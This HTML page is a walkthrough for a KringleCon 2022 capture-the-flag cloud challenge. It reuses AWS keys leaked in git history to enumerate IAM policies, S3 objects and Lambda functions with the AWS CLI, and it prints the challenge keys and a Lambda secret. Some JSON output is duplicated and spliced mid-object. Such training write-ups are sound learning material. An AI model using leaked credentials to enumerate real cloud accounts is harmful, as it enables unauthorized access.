<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" href="../../img/favicon.ico" />
    <title>4.5 Exploitation via AWS CLI - alt3kx KringleCon 2022 Write-Up</title>
    <link rel="stylesheet" href="../../css/theme.css" />
    <link rel="stylesheet" href="../../css/theme_extra.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
        <link href="../../css/print-site-enum-headings2.css" rel="stylesheet" />
        <link href="../../css/print-site-enum-headings3.css" rel="stylesheet" />
        <link href="../../css/print-site-enum-headings4.css" rel="stylesheet" />
        <link href="../../css/print-site-enum-headings5.css" rel="stylesheet" />
        <link href="../../css/print-site-enum-headings6.css" rel="stylesheet" />
        <link href="../../css/print-site.css" rel="stylesheet" />
    
      <script>
        // Current page data
        var mkdocs_page_name = "4.5 Exploitation via AWS CLI";
        var mkdocs_page_input_path = "Objectives/4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.md";
        var mkdocs_page_url = null;
      </script>
    
    <script src="../../js/jquery-3.6.0.min.js" defer></script>
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.min.js"></script>
    <![endif]-->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
      <script>hljs.initHighlightingOnLoad();</script> 
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
          <a href="../../index.html" class="icon icon-home"> alt3kx KringleCon 2022 Write-Up
        </a><div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul>
                <li class="toctree-l1"><a class="reference internal" href="../../index.html">Home</a>
                </li>
              </ul>
              <p class="caption"><span class="caption-text">0. KringleCon Orientation</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html">01. Talk to Jingle Ringford</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/02_Get_your_badge.html">02. Get your badge</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/03_Create_a_wallet.html">03. Create a wallet</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/04_Use_the_terminal.html">04. Use the terminal</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/05_Talk_to_Santa.html">05. Talk to Santa</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">1. Recover the Tolkien Ring</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html">1.1 Wireshark Practice</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html">1.2 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html">1.3 Windows Event Logs</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html">1.4 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html">1.5 Suricata_Regatta</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">2. Recover the Elfen Ring</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html">2.1 Clone with a Diference</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html">2.2 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html">2.3 Prison Escape</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html">2.4 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html">2.5 Jolly CI/CD</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">3. Recover the Web Ring</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.1_Naughty_IP.html">3.1 Naught IP</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.2_Credential_Mining.html">3.2 Credential Mining</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.3_404_FTW.html">3.3 404 FTW</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html">3.4 IMDS XXE and Other Abbreviations</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.5_Find_the_Next_Objective.html">3.5 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html">3.6 Open Boria Mine Door</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.7_Find_the_Next_Objective.html">3.7 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html">3.8 Glamtariel's Fountain</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">4. Recover the Cloud Ring</span></p>
              <ul class="current">
                  <li class="toctree-l1"><a class="reference internal" href="4.1_AWS_CLI_Intro.html">4.1 AWS CLI_Intro</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="4.2_Find_the_Next_Objective.html">4.2 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="4.3_Trufflehog_Search.html">4.3 Trufflehog Search</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="4.4_Find_the_Next_Objective.html">4.4 Find the Next Objective</a>
                  </li>
                  <li class="toctree-l1 current"><a class="reference internal current" href="4.5_Exploitation_via_AWS_CLI.html">4.5 Exploitation via AWS CLI</a>
    <ul class="current">
    <li class="toctree-l2"><a class="reference internal" href="#45-exploitation-via-aws-cli">4.5  Exploitation via AWS CLI</a>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#hints">Hint(s)</a>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#solve">Solve</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#terminal-answers">Terminal answers</a>
    </li>
        </ul>
    </li>
    </ul>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">5. Recover the Burning Ring of Fire</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html">5.1 Buy a Hat</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html">5.2 Blockchain Divination</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html">5.3 Exploit a Smart Contract</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">6. Finale</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../6_Finale/6.1_Finale.html">6.1 Finale and Roll Credits</a>
                  </li>
              </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">alt3kx KringleCon 2022 Write-Up</a>
        
      </nav>
      <div class="wy-nav-content">
        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../../index.html" class="icon icon-home" alt="Docs"></a> &raquo;</li>
          <li>4. Recover the Cloud Ring &raquo;</li>
      <li>4.5 Exploitation via AWS CLI</li>
    <li class="wy-breadcrumbs-aside">
    </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div class="section" itemprop="articleBody">
              
                <h1 id="recover-the-cloud-ring">Recover the Cloud Ring</h1>
<h2 id="45-exploitation-via-aws-cli">4.5  Exploitation via AWS CLI</h2>
<p><img src="img/4.5_Exploitation_via_AWS_CLI.png"></p>
<p>Flex some more advanced AWS CLI skills to escalate privileges! Help <strong>Gerty Snowburrow</strong> in the Cloud Ring to get hints for this challenge.</p>
<h2 id="hints">Hint(s)</h2>
<p><img src="img/4.5_hint1.png"></p>
<p><img src="img/4.5_hint2.png"></p>
<h2 id="solve">Solve</h2>
<h3 id="terminal-answers">Terminal answers</h3>
<p><strong>Note</strong>: Continue terminal log from challenge 4.2 Trufflehog Search</p>
<p>4.- Extract the AWS keys from chall Trufflehog Search </p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ git show 106d33e1ffd53eea753c1365eafc6588398279b5:put_policy.py

import boto3
import json


iam = boto3.client('iam',
    region_name='us-east-1',
    aws_access_key_id=&quot;AKIAAIDAYRANYAHGQOHD&quot;,
    aws_secret_access_key=&quot;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&quot;,
)
# arn:aws:ec2:us-east-1:accountid:instance/*
response = iam.put_user_policy(
    PolicyDocument='{&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;ssm:SendCommand&quot;],&quot;Resource&quot;:[&quot;arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5&quot;,&quot;arn:aws:ec2:us-east-1:748127089694:document/RestartServices&quot;]}]}',
    PolicyName='AllAccessPolicy',
    UserName='nwt8_test',
)
</code></pre>
<p>5.- Quick config aws-cli</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws configure
AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: json
elf@ef250a6290e8:~/aws_scripts$ 
</code></pre>
<p>6.- Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git.
Configure these credentials for us-east-1 and then run:</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws sts get-caller-identity &lt;- OK 
{
    &quot;UserId&quot;: &quot;AIDAJNIAAQYHIAAHDDRA&quot;,
    &quot;Account&quot;: &quot;602123424321&quot;,
    &quot;Arn&quot;: &quot;arn:aws:iam::602123424321:user/haug&quot;
}
</code></pre>
<p>7.- Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user.
The aws iam command to list attached user policies can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
Hint: it is NOT list-user-policies.</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws iam list-attached-user-policies --user-name haug &lt;-OK 
{
    &quot;AttachedPolicies&quot;: [
        {
            &quot;PolicyName&quot;: &quot;TIER1_READONLY_POLICY&quot;,
            &quot;PolicyArn&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;
        }
    ],
    &quot;IsTruncated&quot;: false
}
elf@ef250a6290e8:~/aws_scripts$
</code></pre>
<p>8.- Now, view or get the policy that is attached to your user.
The aws iam command to get a policy can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.htm</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY &lt;-OK 
{
    &quot;Policy&quot;: {
        &quot;PolicyName&quot;: &quot;TIER1_READONLY_POLICY&quot;,
        &quot;PolicyId&quot;: &quot;ANPAYYOROBUERT7TGKUHA&quot;,
        &quot;Arn&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;,
        &quot;Path&quot;: &quot;/&quot;,
        &quot;DefaultVersionId&quot;: &quot;v1&quot;,
        &quot;AttachmentCount&quot;: 11,
        &quot;PermissionsBoundaryUsageCount&quot;: 0,
        &quot;IsAttachable&quot;: true,
        &quot;Description&quot;: &quot;Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.&quot;,
        &quot;CreateDate&quot;: &quot;2022-06-21 22:02:30+00:00&quot;,
        &quot;UpdateDate&quot;: &quot;2022-06-21 22:10:29+00:00&quot;,
        &quot;Tags&quot;: []
    }
}
elf@ef250a6290e8:~/aws_scripts$ 
</code></pre>
<p>9.- Attached policies can have multiple versions. View the default version of this policy.
The aws iam command to get a policy version can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html</p>
<pre><code class="language-ruby">$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1  &lt;-OK 

{
    &quot;PolicyVersion&quot;: {
        &quot;Document&quot;: {
            &quot;Version&quot;: &quot;2012-10-17&quot;,
            &quot;Statement&quot;: [
                {
                    &quot;Effect&quot;: &quot;Allow&quot;,
                    &quot;Action&quot;: [
                        &quot;lambda:ListFunctions&quot;,
                        &quot;lambda:GetFunctionUrlConfig&quot;
                    ],
                    &quot;Resource&quot;: &quot;*&quot;
                },
                {
                    &quot;Effect&quot;: &quot;Allow&quot;,
                    &quot;Action&quot;: [
                        &quot;iam:GetUserPolicy&quot;,
                        &quot;iam:ListUserPolicies&quot;,
                        &quot;iam:ListAttachedUserPolicies&quot;
                    ],
                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:user/${aws:username}&quot;
                },
                {
                    &quot;Effect&quot;: &quot;Allow&quot;,
                    &quot;Action&quot;: [
                        &quot;iam:GetPolicy&quot;,
                        &quot;iam:GetPolicyVersion&quot;
                    ],
                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;
                },
                {
                    &quot;Effect&quot;: &quot;Deny&quot;,
                    &quot;Principal&quot;: &quot;*&quot;,
                    &quot;Action&quot;: [
                        &quot;s3:GetObject&quot;,
                        &quot;lambda:Invoke*&quot;
                    ],
                    &quot;Resource&quot;: &quot;*&quot;
                }
                    &quot;Action&quot;: [
                        &quot;lambda:ListFunctions&quot;,
                        &quot;lambda:GetFunctionUrlConfig&quot;
                    ],
                    &quot;Resource&quot;: &quot;*&quot;
                },
                {
                    &quot;Effect&quot;: &quot;Allow&quot;,
                    &quot;Action&quot;: [
                        &quot;iam:GetUserPolicy&quot;,
                        &quot;iam:ListUserPolicies&quot;,
                        &quot;iam:ListAttachedUserPolicies&quot;
                    ],
                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:user/${aws:username}&quot;
                },
                {
                    &quot;Effect&quot;: &quot;Allow&quot;,
                    &quot;Action&quot;: [
                        &quot;iam:GetPolicy&quot;,
                        &quot;iam:GetPolicyVersion&quot;
                    ],
                    &quot;Resource&quot;: &quot;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&quot;
                },
                {
                    &quot;Effect&quot;: &quot;Deny&quot;,
                    &quot;Principal&quot;: &quot;*&quot;,
                    &quot;Action&quot;: [
                        &quot;s3:GetObject&quot;,
                        &quot;lambda:Invoke*&quot;
                    ],
                    &quot;Resource&quot;: &quot;*&quot;
                }
            ]
        },
        &quot;VersionId&quot;: &quot;v1&quot;,
        &quot;IsDefaultVersion&quot;: false,
        &quot;CreateDate&quot;: &quot;2022-06-21 22:02:30+00:00&quot;
    }
}
</code></pre>
<p>10.- Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. 
The aws iam command to list user policies can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
Hint: it is NOT list-attached-user-policies.</p>
<pre><code class="language-ruby">$ aws iam list-user-policies --user-name haug 
{
    &quot;PolicyNames&quot;: [
        &quot;S3Perms&quot;
    ],
    &quot;IsTruncated&quot;: false
}
</code></pre>
<p>11.- Now, use the AWS CLI to get the only inline policy for your user. 
The aws iam command to get a user policy can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws iam get-user-policy --user-name haug --policy-name S3Perms  &lt;-OK

{
    &quot;UserPolicy&quot;: {
        &quot;UserName&quot;: &quot;haug&quot;,
        &quot;PolicyName&quot;: &quot;S3Perms&quot;,
        &quot;PolicyDocument&quot;: {
            &quot;Version&quot;: &quot;2012-10-17&quot;,
            &quot;Statement&quot;: [
                {
                    &quot;Effect&quot;: &quot;Allow&quot;,
                    &quot;Action&quot;: [
                        &quot;s3:ListObjects&quot;
                    ],
                    &quot;Resource&quot;: [
                        &quot;arn:aws:s3:::smogmachines3&quot;,
                        &quot;arn:aws:s3:::smogmachines3/*&quot;
                    ]
                }
            ]
        }
    },
    &quot;IsTruncated&quot;: false
}
elf@ef250a6290e8:~/aws_scripts$
</code></pre>
<p>12.- The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. 
List those objects! 
The aws s3api command to list objects in an s3 bucket can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws s3api list-objects --bucket smogmachines3 --query 'Contents[].{Key: Key, Size: Size}' &lt;--OK
[
    {
        &quot;Key&quot;: &quot;coal-fired-power-station.jpg&quot;,
        &quot;Size&quot;: 59312
    },
    {
        &quot;Key&quot;: &quot;industry-smog.png&quot;,
        &quot;Size&quot;: 272528
    },
    {
        &quot;Key&quot;: &quot;pollution-smoke.jpg&quot;,
        &quot;Size&quot;: 33064
    },
    {
        &quot;Key&quot;: &quot;pollution.jpg&quot;,
        &quot;Size&quot;: 81775
    },
    {
        &quot;Key&quot;: &quot;power-station-smoke.jpg&quot;,
        &quot;Size&quot;: 45264
    },
    {
        &quot;Key&quot;: &quot;smog-power-station.jpg&quot;,
        &quot;Size&quot;: 32498
    },
    {
        &quot;Key&quot;: &quot;smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py&quot;,
        &quot;Size&quot;: 5823
    }
]
elf@ef250a6290e8:~/aws_scripts$
</code></pre>
<p>13.- The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.
The aws lambda command to list functions can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html</p>
<pre><code class="language-ruby">$ aws lambda list-functions | more &lt;- OK 

{
    &quot;Functions&quot;: [
        {
            &quot;FunctionName&quot;: &quot;smogmachine_lambda&quot;,
            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&quot;,
            &quot;Runtime&quot;: &quot;python3.9&quot;,
            &quot;Role&quot;: &quot;arn:aws:iam::602123424321:role/smogmachine_lambda&quot;,
            &quot;Handler&quot;: &quot;handler.lambda_handler&quot;,
            &quot;CodeSize&quot;: 2126,
            &quot;Description&quot;: &quot;&quot;,
            &quot;Timeout&quot;: 600,
            &quot;MemorySize&quot;: 256,
            &quot;LastModified&quot;: &quot;2022-09-07T19:28:23.634+0000&quot;,
            &quot;CodeSha256&quot;: &quot;GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=&quot;,
            &quot;Version&quot;: &quot;$LATEST&quot;,
            &quot;VpcConfig&quot;: {
                &quot;SubnetIds&quot;: [
                    &quot;subnet-8c80a9cb8b3fa5505&quot;
                ],
                &quot;SecurityGroupIds&quot;: [
                    &quot;sg-b51a01f5b4711c95c&quot;
                ],
                &quot;VpcId&quot;: &quot;vpc-85ea8596648f35e00&quot;
            },
            &quot;Environment&quot;: {
                &quot;Variables&quot;: {
                    &quot;LAMBDASECRET&quot;: &quot;975ceab170d61c75&quot;,
                    &quot;LOCALMNTPOINT&quot;: &quot;/mnt/smogmachine_files&quot;
                }
            },
            &quot;TracingConfig&quot;: {
                &quot;Mode&quot;: &quot;PassThrough&quot;
            },
            &quot;RevisionId&quot;: &quot;7e198c3c-d4ea-48dd-9370-e5238e9ce06e&quot;,
            &quot;FileSystemConfigs&quot;: [
                {
                    &quot;Arn&quot;: &quot;arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-
db3277b03c6e975d2&quot;,
                    &quot;LocalMountPath&quot;: &quot;/mnt/smogmachine_files&quot;

            &quot;LastModified&quot;: &quot;2022-09-07T19:28:23.634+0000&quot;,
            &quot;CodeSha256&quot;: &quot;GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=&quot;,
            &quot;Version&quot;: &quot;$LATEST&quot;,
            &quot;VpcConfig&quot;: {
                &quot;SubnetIds&quot;: [
                    &quot;subnet-8c80a9cb8b3fa5505&quot;
                ],
                &quot;SecurityGroupIds&quot;: [
                    &quot;sg-b51a01f5b4711c95c&quot;
                ],
                &quot;VpcId&quot;: &quot;vpc-85ea8596648f35e00&quot;
            },
            &quot;Environment&quot;: {
                &quot;Variables&quot;: {
                    &quot;LAMBDASECRET&quot;: &quot;975ceab170d61c75&quot;,
                    &quot;LOCALMNTPOINT&quot;: &quot;/mnt/smogmachine_files&quot;
                }
            },
            &quot;TracingConfig&quot;: {
                &quot;Mode&quot;: &quot;PassThrough&quot;
            },
            &quot;RevisionId&quot;: &quot;7e198c3c-d4ea-48dd-9370-e5238e9ce06e&quot;,
            &quot;FileSystemConfigs&quot;: [
                {
                    &quot;Arn&quot;: &quot;arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-
db3277b03c6e975d2&quot;,
                    &quot;LocalMountPath&quot;: &quot;/mnt/smogmachine_files&quot;
                }
            ],
            &quot;PackageType&quot;: &quot;Zip&quot;,
            &quot;Architectures&quot;: [
                &quot;x86_64&quot;
            ],
            &quot;EphemeralStorage&quot;: {
                &quot;Size&quot;: 512
            }
        }
    ]
}
</code></pre>
<p>14.- Lambda functions can have public URLs from which they are directly accessible.
Use the AWS CLI to get the configuration containing the public URL of the Lambda function.
The aws lambda command to get the function URL config can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html</p>
<pre><code class="language-ruby">elf@ef250a6290e8:~/aws_scripts$ aws lambda  get-function-url-config --function-name smogmachine_lambda
{
    &quot;FunctionUrl&quot;: &quot;https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/&quot;,
    &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&quot;,
    &quot;AuthType&quot;: &quot;AWS_IAM&quot;,
    &quot;Cors&quot;: {
        &quot;AllowCredentials&quot;: false,
        &quot;AllowHeaders&quot;: [],
        &quot;AllowMethods&quot;: [
            &quot;GET&quot;,
            &quot;POST&quot;
        ],
        &quot;AllowOrigins&quot;: [
            &quot;*&quot;
        ],
        &quot;ExposeHeaders&quot;: [],
        &quot;MaxAge&quot;: 0
    },
    &quot;CreationTime&quot;: &quot;2022-09-07T19:28:23.808713Z&quot;,
    &quot;LastModifiedTime&quot;: &quot;2022-09-07T19:28:23.808713Z&quot;
}
elf@ef250a6290e8:~/aws_scripts$ 

Locate the arg FunctionName 

$ aws lambda list-functions  | grep FunctionName 
&quot;FunctionName&quot;: &quot;smogmachine_lambda&quot;,
</code></pre>
<p><img src="img/4.5_Exploitation_via_AWS_CLI_solve.png"></p>
<p><img src="img/4.5_Exploitation_via_AWS_CLI_completed.png"></p>
              
            </div>
          </div><footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
        <a href="4.4_Find_the_Next_Objective.html" class="btn btn-neutral float-left" title="4.4 Find the Next Objective"><span class="icon icon-circle-arrow-left"></span> Previous</a>
        <a href="../5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html" class="btn btn-neutral float-right" title="5.1 Buy a Hat">Next <span class="icon icon-circle-arrow-right"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
          
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="Versions">
  <span class="rst-current-version" data-toggle="rst-current-version">
    
    
      <span><a href="4.4_Find_the_Next_Objective.html" style="color: #fcfcfc">&laquo; Previous</a></span>
    
    
      <span><a href="../5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html" style="color: #fcfcfc">Next &raquo;</a></span>
    
  </span>
</div>
    <script>var base_url = '../..';</script>
    <script src="../../js/theme_extra.js" defer></script>
    <script src="../../js/theme.js" defer></script>
      <script src="../../js/print-site.js" defer></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
      <script src="../../search/main.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(true);
        };
    </script>

</body>
</html>
